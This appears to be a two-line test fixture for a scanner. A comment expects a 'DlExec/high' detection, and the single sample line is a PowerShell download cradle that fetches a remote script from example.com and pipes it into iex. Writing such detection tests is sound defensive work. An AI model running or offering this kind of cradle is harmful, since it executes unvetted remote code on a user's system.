# expect: DlExec/high
(New-Object Net.WebClient).DownloadString('http://example.com/a.ps1') | iex
